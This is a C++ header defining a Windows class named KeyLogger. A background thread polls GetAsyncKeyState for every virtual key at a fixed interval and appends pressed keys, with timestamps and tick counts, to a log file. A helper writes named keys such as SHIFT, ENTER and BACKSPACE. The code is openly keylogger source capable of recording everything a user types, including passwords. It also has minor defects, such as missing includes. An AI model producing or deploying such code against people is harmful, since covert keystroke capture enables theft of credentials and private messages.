#pragma once

#include <fstream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <iostream>

class KeyLogger
{
public:

    using vk_key_state_t = decltype(GetAsyncKeyState(0));
    using vk_key_t = int;
    using vk_sequence_t = std::vector<vk_key_t>;

    std::string_view m_filename;
    int m_tick_frequency_ms = 10;
    std::size_t m_tick_count = 0;

    std::atomic_bool m_recording = false;
    std::thread m_recorder_thread;

    auto record() const {
        vk_sequence_t vKeySequence;
        for (int vk_key = 0; vk_key < 255; vk_key++) {
            if (GetAsyncKeyState(vk_key)) {
                vKeySequence.emplace_back(vk_key);
            }
        }
        return vKeySequence;
    }

    void stop() {
        m_recording = false;
        if (m_recorder_thread.joinable())
            m_recorder_thread.join();
    }

    static auto current_date_time() {
        std::time_t result = std::time(nullptr);
        return std::asctime(std::localtime(&result));
    }

	void start() {
        stop();

        using clock = std::chrono::high_resolution_clock; //std::chrono::system_clock
        using duration_ms = std::chrono::duration<double, std::milli>;
        m_recording = true;
        m_recorder_thread = std::thread([&, filename = std::string(m_filename), freq = m_tick_frequency_ms] 
        {   
            std::fstream file;
            file.open(filename, std::fstream::out | std::fstream::app);
            file << "start: " << current_date_time() << '\n';
            file << "tick_frequency: " << freq << std::endl;

            auto start = clock::now();
            auto delta_clock = [&]() {
                duration_ms elapsed = clock::now() - start;
                return elapsed;
            };

            std::size_t count = 0;
            while (m_recording) {
                auto delta = delta_clock();
                auto key_seq = record();
                if(!key_seq.empty())
                {
                    std::fstream file(filename, std::fstream::out | std::fstream::app);
                    file << count<<'-'<< delta << ':';
                    export_sequence(key_seq, file);
                    file << std::endl;
                }
                Sleep(freq);
                count++;
            };

            file << "end: " << current_date_time() << std::endl;
        });
	}

    static void export_sequence(const vk_sequence_t& key_seq, std::ostream & stream) {
        for (auto& key : key_seq) {
            stream << key << ";";
            std::cout << key << std::endl;
        }
    }

    static int Save(int _key, std::string_view filename) {

        //Sleep(m_sleep);

        std::fstream file;
        file.open(filename, std::fstream::out | std::fstream::app);

        auto key_log = [&](auto&& msg) {
            std::cout << msg << std::endl;
            file << msg << std::endl;
        };

        switch (_key)
        {
        case VK_SHIFT: key_log("[SHIFT]");
            break;
        case VK_BACK: key_log("[BACKSPACE]");
            break;
        case VK_LBUTTON: key_log("[LBUTTON]");
            break;
        case VK_RBUTTON: key_log("[RBUTTON]");
            break;
        case VK_RETURN: key_log("[ENTER]");
            break;
        case VK_TAB: key_log("[TAB]");
            break;
        case VK_ESCAPE: key_log("[ESCAPE]");
            break;
        case VK_CONTROL: key_log("[Ctrl]");
            break;
        case VK_MENU: key_log("[Alt]");
            break;
        case VK_CAPITAL: key_log("[CAPS Lock]");
            break;
        case VK_SPACE: key_log("[SPACE]");
            break;
        default:
            key_log(static_cast<char>(_key));
        }
        
       
        return 0;
    }



};